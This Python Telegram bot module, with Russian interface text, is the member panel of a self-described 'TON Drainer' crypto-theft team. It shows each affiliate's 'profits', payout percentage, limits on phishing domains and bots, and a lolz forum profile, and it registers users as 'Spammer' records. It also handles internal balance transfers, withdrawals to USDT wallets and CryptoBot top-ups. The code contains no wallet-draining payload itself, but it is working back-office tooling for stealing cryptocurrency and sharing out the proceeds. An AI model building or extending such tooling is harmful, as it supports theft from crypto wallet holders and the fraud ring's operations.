from decimal import Decimal

from aiocryptopay import AioCryptoPay
from aiogram import types, Router, F, Bot
from aiogram.filters import CommandStart, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.types import CallbackQuery, Message
from sqlalchemy.ext.asyncio import AsyncSession
from utils import check_crypto_bot_invoice
import keyboards.main_keyboard
from states import states
from keyboards import main_keyboard
import config
from sqlalchemy import select
from database import models
from database.database import get_db
from database.models import User, CryptoBot_invoices, Spammer
from keyboards.main_keyboard import main_menu
from middlewares.user_middleware import AuthorizeMiddleware

router = Router()  # Создаем роутер для обработчиков
router.message.middleware(AuthorizeMiddleware())
router.callback_query.middleware(AuthorizeMiddleware())


@router.message(CommandStart())
async def start(message: Message, session: AsyncSession):

    await message.answer("Добро пожаловать!", reply_markup=main_menu)
    result = await session.execute(select(Spammer).where(Spammer.user_tg_id == message.from_user.id))
    spammer = result.scalars().first()

    if not spammer:
        spammer = Spammer(user_tg_id=message.from_user.id)
        session.add(spammer)
        await session.commit()


@router.message(F.text == "👤 Мой профиль")  # Используем Text фильтр
async def profile(message: Message, user: User):
    if user:
        text = (f"<b>Добро пожаловать в профиль</b>\n"
                f"<b>{config.TEAM_NAME} TON Drainer</b>\n\n"
                f"1️⃣ <b>Информация:</b>\n"
                f"└👉 TG ID: <code>{user.tg_id}</code>\n"
                f"└👉 Профиль lolz: <code>{user.lolz_profile}\n</code>"
                f"└❕ Отображение ника в выплатах: <code>{user.nickname_display}</code>\n"
                f"└👤 Статус: <code>{user.status}</code>\n"
                f"└💲 Процент: <code>{user.percentage}</code>\n"
                f"└⁉️ Лимит доменов: <code>{user.domains_limit}</code>\n"
                f"└⁉️ Лимит ботов: <code>{user.bots_limit}</code>\n\n"
                f"📊 <b>Статистика:</b>\n"
                f"└💵 Текущий баланс: <code>{user.balance}$</code>\n"
                f"└💰 Профитов: <code>{user.profits}$</code>\n"
                f"└📅 Дата регистрации: <code>{user.registration_date}</code>\n\n"
                f"💳 <b>Привязанные кошельки:</b>\n"
                f"└TON: <code>{user.ton_wallet}</code>\n")

        await message.answer(text, parse_mode='HTML', reply_markup=main_keyboard.profile_menu)
    else:
        await message.answer("Профиль не найден.")


@router.callback_query(F.data == 'change_nickname')
async def change_nickname(call: CallbackQuery, session: AsyncSession, state: states.ProfileState.new_nickname):
    if call.data == 'change_nickname':
        await call.message.answer('Введите новый никнейм ниже.')
        await state.set_state(states.ProfileState.new_nickname)


@router.message(StateFilter(states.ProfileState.new_nickname))
async def nickname_set(message: Message, state: FSMContext, session: AsyncSession, user: User):
    new_nickname = message.text

    try:
        async with session.begin():  # Use async with for database operations
            user.nickname_display = new_nickname  # Update the nickname
            await session.commit()  # Commit the changes
            await message.answer(f"Никнейм успешно изменен на: {new_nickname}")

    except Exception as e:  # Handle potential errors
        await message.answer(f"Произошла ошибка при изменении никнейма: {e}")
        await session.rollback()  # Rollback in case of error
    finally:
        await state.clear()  # Finish the state


@router.callback_query(F.data == 'transfer_funds')
async def transer_money(call: CallbackQuery, state: FSMContext):
    if call.data == 'transfer_funds':
        await call.message.answer("🔄 Введите ID или имя пользователя для перевода.")
        await state.set_state(states.ProfileState.id_or_nick)


@router.message(StateFilter(states.ProfileState.id_or_nick))
async def nick_for_transfer(message: Message, session: AsyncSession, user: User, state: FSMContext):
    nick_or_id = message.text
    try:
        async with session.begin():
            # 1. Пытаемся найти пользователя по nickname_display
            user_by_nickname = await session.execute(
                select(User).where(User.nickname_display == nick_or_id)
            )
            user_by_nickname = user_by_nickname.scalars().first()

            # 2. Если не нашли по nickname_display, пытаемся найти по tg_id
            if not user_by_nickname:
                try:
                    nick_or_id = int(nick_or_id)  # Try converting to int first
                    user_by_tg_id = await session.execute(
                        select(User).where(User.tg_id == nick_or_id)  # Use select for tg_id
                    )
                    user_by_tg_id = user_by_tg_id.scalars().first()
                except ValueError:  # Handle cases where nick_or_id is not an integer
                    user_by_tg_id = None
            else:
                user_by_tg_id = None

            user_found = user_by_nickname or user_by_tg_id

            if user_found and user_found.id != user.id:
                # Пользователь найден и это не текущий пользователь
                # ... (логика перевода средств для user_found)
                await message.answer(f"Пользователь {nick_or_id} найден. ID: {user_found.id}\n"
                                     f"Введите сумму в $ для перевода. Максимум две цифры после точки, остальные не будут учитываться (Пример: 2.56)")
                await state.update_data(id_or_nick=user_found.tg_id)  # Store the user object
                await state.set_state(states.ProfileState.transfer_amount)
            else:
                # Пользователь не найден или пытается перевести себе
                await message.answer(
                    "Пользователь не найден или вы не можете перевести средства себе. Попробуйте заново.")
                await state.clear()  # Остаемся в этом состоянии

    except Exception as e:
        await message.answer(f"Произошла ошибка: {e}")
        await session.rollback()
        await state.clear()


@router.message(StateFilter(states.ProfileState.transfer_amount))
async def amount_for_transfer(message: Message, session: AsyncSession, user: User,
                              state: FSMContext, bot: Bot):
    amount_str = message.text  # Получаем сумму как строку

    try:
        amount = float(amount_str)  # Пытаемся преобразовать в float
    except ValueError:
        await message.answer("Сумма должна быть числом. Используйте точку в качестве разделителя. Попробуйте еще раз.")
        await state.clear()
        return  # Выходим из функции, если преобразование не удалось

    if amount <= 0:  # Проверяем, что сумма больше нуля
        await message.answer("Сумма должна быть больше нуля. Попробуйте еще раз.")
        await state.clear()
        return

    amount = round(amount, 2)

    if amount > user.balance:  # Проверяем, достаточно ли средств на балансе
        await message.answer("Недостаточно средств на балансе. Пополните баланс и попробуйте еще раз.")
        await state.clear()
        return

    data = await state.get_data()
    user_nick_or_id = data.get("id_or_nick")
    try:
        async with session.begin():
            user_found_result = await session.execute(select(User).where(User.tg_id == user_nick_or_id))
            user_found = user_found_result.scalars().first()

            if user_found:
                if user_found.id == user.id:
                    await message.answer("Вы не можете перевести средства себе.")
                    return

                # Выполняем перевод средств
                user.balance = Decimal(str(user.balance)) - Decimal(str(amount))  # Subtract
                user_found.balance = Decimal(str(user_found.balance)) + Decimal(str(amount))  # Add

                await session.commit()  # Фиксируем изменения в базе данных

                await message.answer(
                    f"Перевод успешно выполнен. {amount} $ переведено пользователю {user_nick_or_id} с никнемом: {user_found.nickname_display}.")
                await bot.send_message(user_found.tg_id,
                                       text=f'Пользователь {user.tg_id} или {user.nickname_display} перевел вам {amount} $')
                await state.clear()
            else:
                await message.answer("Пользователь не найден.")
                await state.clear()  # Остаемся в состоянии id_or_nick

    except Exception as e:
        await message.answer(f"Произошла ошибка при переводе средств: {e}")
        await session.rollback()
    finally:
        await state.clear()


@router.callback_query(F.data == 'withdraw_funds')
async def withdraw_money(call: CallbackQuery, state: FSMContext):
    if call.data == 'withdraw_funds':
        await call.message.answer(
            'Введите сумму для вывода в $. Максимум две цифры после точки, остальные не будут учитываться (Пример: 2.56)')
        await state.set_state(states.ProfileState.withdraw_amount)


@router.message(StateFilter(states.ProfileState.withdraw_amount))
async def withdraw_amount(message: Message, state: FSMContext, user: User):
    amount_str = message.text  # Получаем сумму как строку

    try:
        amount = float(amount_str)  # Пытаемся преобразовать в float
    except ValueError:
        await message.answer("Сумма должна быть числом. Используйте точку в качестве разделителя. Попробуйте еще раз.")
        await state.clear()
        return  # Выходим из функции, если преобразование не удалось

    if amount <= 0:  # Проверяем, что сумма больше нуля
        await message.answer("Сумма должна быть больше нуля. Попробуйте еще раз.")
        await state.clear()
        return

    amount = round(amount, 2)

    if amount > user.balance:  # Проверяем, достаточно ли средств на балансе
        await message.answer("Недостаточно средств на балансе. Пополните баланс и попробуйте еще раз.")
        await state.clear()
        return

    await state.update_data(withdraw_amount=amount)
    await message.answer(
        '🖇 Пришлите адрес вашего кошелька USDT в Сети TRC-20\n<b>❗️Важно, если вы пришлете неверный адрес или адрес другой сети, то деньги могут не поступить❗️</b>', parse_mode='HTML')
    await state.set_state(states.ProfileState.withdraw_wallet)


@router.message(StateFilter(states.ProfileState.withdraw_wallet))
async def withdraw_wallet(message: Message, state: FSMContext, user: User):
    wallet = message.text
    await state.update_data(withdraw_wallet=wallet)
    data = await state.get_data()
    amount = data.get('withdraw_amount')
    wallet = data.get('withdraw_wallet')
    await message.answer(f'Вы уверены что хотите вывести {amount} $ на адрес {wallet}?',
                         reply_markup=keyboards.main_keyboard.withdraw_decision_kb)


@router.callback_query(F.data == 'withdraw_confirm')
async def confirm_withdraw(call: CallbackQuery, state: FSMContext, user: User, session: AsyncSession, bot: Bot):
    data = await state.get_data()
    amount = data.get('withdraw_amount')
    wallet = data.get('withdraw_wallet')
    await state.clear()
    try:
        async with session.begin():
            user.balance = Decimal(str(user.balance)) - Decimal(str(amount))  # Subtract
            await session.commit()  # Фиксируем изменения в базе данных
            await call.message.answer(f'Вывод успешно выполнен. Ожидайте вывода от администратора.')
            for id in config.ADMINS_IDS:
                await bot.send_message(id,
                                       text=f'Пользователь {user.tg_id} или {user.nickname_display} хочет вывести {amount} $ на адрес {wallet}')
    except Exception as e:
        await call.message.answer(f"Произошла ошибка при выводе средств: {e}")
        await session.rollback()


@router.callback_query(F.data == 'withdraw_cancel')
async def cancel_withdraw(call: CallbackQuery, state: FSMContext):
    await state.clear()
    await call.message.answer('Вывод отменен.')


@router.callback_query(F.data == 'top_up')
async def top_up_money(call: CallbackQuery, state: FSMContext):
    if call.data == 'top_up':
        crypto_bot_link = "https://t.me/CryptoBot"
        message_text = (
            f'<b><a href="{crypto_bot_link}">⚜️ CryptoBot</a></b>\n\n'
            '— Минимум: <b>0.1 $</b>\n\n'
            '<b>💸 Введите сумму пополнения в долларах</b>'
        )
        await call.message.edit_text(text=message_text, parse_mode='HTML', disable_web_page_preview=True)
        await state.set_state(states.ProfileState.top_up_amount)


@router.message(StateFilter(states.ProfileState.top_up_amount))
async def change_balance(message: Message, state: FSMContext):
    try:
        if float(message.text) >= 0.1:

            crypto_bot_link = "https://t.me/CryptoBot"
            message_text = (
                f'<b><a href="{crypto_bot_link}">⚜️ CryptoBot</a></b>\n\n'
                f'— Сумма: <b>{message.text} $</b>\n\n'
                '<b>💸 Выберите валюту, которой хотите оплатить счёт</b>'
            )
            await message.answer(text=message_text, parse_mode='HTML', disable_web_page_preview=True,
                                 reply_markup=keyboards.main_keyboard.get_crypto_bot_currencies())
            await state.update_data(top_up_amount=float(message.text))
        else:
            await message.answer(
                '<b>⚠️ Минимум: 0.1 $!<b>'
            )
    except ValueError:
        await message.answer(
            '<b>❗️Сумма для пополнения должна быть в числовом формате!</b>', parse_mode='HTML'
        )


@router.callback_query(lambda callback_query: callback_query.data.startswith('crypto_bot_currency|'))
async def set_payment_crypto_bot(callback_query: types.CallbackQuery, state: FSMContext, bot: Bot, session: AsyncSession):  # Add bot argument
    try:
        await callback_query.message.delete()  # Delete the initial message with the currency buttons

        cryptopay = AioCryptoPay(config.CRYPTO_BOT_TOKEN)
        asset = callback_query.data.split('|')[1].upper()
        payment_data = await state.get_data()
        amount = payment_data.get('top_up_amount')
        invoice = await cryptopay.create_invoice(asset=asset, amount=amount)
        await cryptopay.close()

        # Send the payment message *before* interacting with the database
        payment_message = await callback_query.message.answer(  # Capture the message object
            f'<b>💸 Отправьте {amount} $ <a href="{invoice.bot_invoice_url}">по ссылке</a></b>',
            parse_mode='HTML',
            reply_markup=keyboards.main_keyboard.check_crypto_bot_kb(invoice.bot_invoice_url, invoice.invoice_id)
        )
        await state.clear()

        try:
            async with session:  # Create a new session within the context
                try:
                    existing_invoice = await session.execute(
                        select(CryptoBot_invoices).where(CryptoBot_invoices.invoice_id == invoice.invoice_id)
                    )
                    existing_invoice = existing_invoice.scalars().first()

                    if existing_invoice:
                        existing_invoice.amount = amount
                    else:
                        new_invoice = CryptoBot_invoices(invoice_id=invoice.invoice_id, amount=amount)
                        session.add(new_invoice)

                    await session.commit()
                    await session.refresh(new_invoice if not existing_invoice else existing_invoice)

                except Exception as db_e:  # Catch database errors separately
                    await session.rollback()
                    print(f"Database error: {db_e}")  # Log the database error
                    await payment_message.edit_text(  # Edit the payment message
                        f"<b>⚠️ Произошла ошибка при сохранении инвойса: {db_e}</b>", parse_mode="HTML"
                    )
                    return  # Stop processing if database error

        except Exception as e:  # Catch cryptopay errors
            print(f"CryptoPay error: {e}")  # Log the CryptoPay error
            await payment_message.edit_text(  # Edit the payment message
                f"<b>⚠️ Произошла ошибка при создании инвойса: {e}</b>", parse_mode="HTML"
            )
            return  # Stop processing if CryptoPay error

    except Exception as final_e:  # Catch any other errors
        print(f"Unexpected error: {final_e}")  # Log the unexpected error
        await callback_query.message.answer(f'<b>⚠️ Произошла непредвиденная ошибка: {final_e}</b>', parse_mode="HTML")


@router.callback_query(lambda callback_query: callback_query.data.startswith('check_crypto_bot'))
async def check_crypto_bot(call: types.CallbackQuery, state: FSMContext, user: User, session: AsyncSession):
    async with session.begin():
        payment = await session.execute(
            select(CryptoBot_invoices).where(CryptoBot_invoices.invoice_id == int(call.data.split('|')[1]))
        )
        payment = payment.scalars().first()
    if payment:
        if await check_crypto_bot_invoice(int(call.data.split('|')[1])):
            async with session.begin():
                user.balance = Decimal(str(user.balance)) + Decimal(str(payment.amount))  # Add
                await session.commit()  # Фиксируем изменения в базе данных
            await call.answer(
                '✅ Оплата прошла успешно!',
                show_alert=True
            )
            await call.message.delete()
            await call.message.answer(
                f'<b>💸 Ваш баланс пополнен на сумму {payment.amount} $!</b>', parse_mode='HTML'
            )
            await state.clear()
            for admin in config.ADMINS_IDS:
                await call.bot.send_message(
                    admin,
                    f'<b><a href="https://t.me/CryptoBot">⚜️ CryptoBot</a></b>\n'
                    f'<b>💸 Обнаружено пополнение от @{call.from_user.username} [<code>{call.from_user.id}</code>] '
                    f'на сумму {payment.amount} $!</b>', parse_mode='HTML'
                )
        else:
            await call.answer(
                '❗️ Вы не оплатили счёт!',
                show_alert=True
            )


@router.callback_query(F.data == 'cancel_crypto_bot')
async def cancel_crypto_bot(call: types.CallbackQuery, state: FSMContext, user: User):
    await state.clear()
    if user:
        text = (f"<b>Добро пожаловать в профиль</b>\n"
                f"<b>{config.TEAM_NAME} TON Drainer</b>\n\n"
                f"1️⃣ <b>Информация:</b>\n"
                f"└👉 TG ID: <code>{user.tg_id}</code>\n"
                f"└👉 Профиль lolz: <code>{user.lolz_profile}\n</code>"
                f"└❕ Отображение ника в выплатах: <code>{user.nickname_display}</code>\n"
                f"└👤 Статус: <code>{user.status}</code>\n"
                f"└💲 Процент: <code>{user.percentage}</code>\n"
                f"└⁉️ Лимит доменов: <code>{user.domains_limit}</code>\n"
                f"└⁉️ Лимит ботов: <code>{user.bots_limit}</code>\n\n"
                f"📊 <b>Статистика:</b>\n"
                f"└💵 Текущий баланс: <code>{user.balance}$</code>\n"
                f"└💰 Профитов: <code>{user.profits}$</code>\n"
                f"└📅 Дата регистрации: <code>{user.registration_date}</code>\n\n"
                f"💳 <b>Привязанные кошельки:</b>\n"
                f"└TON: <code>{user.ton_wallet}</code>\n")

        await call.message.answer(text, parse_mode='HTML', reply_markup=main_keyboard.profile_menu)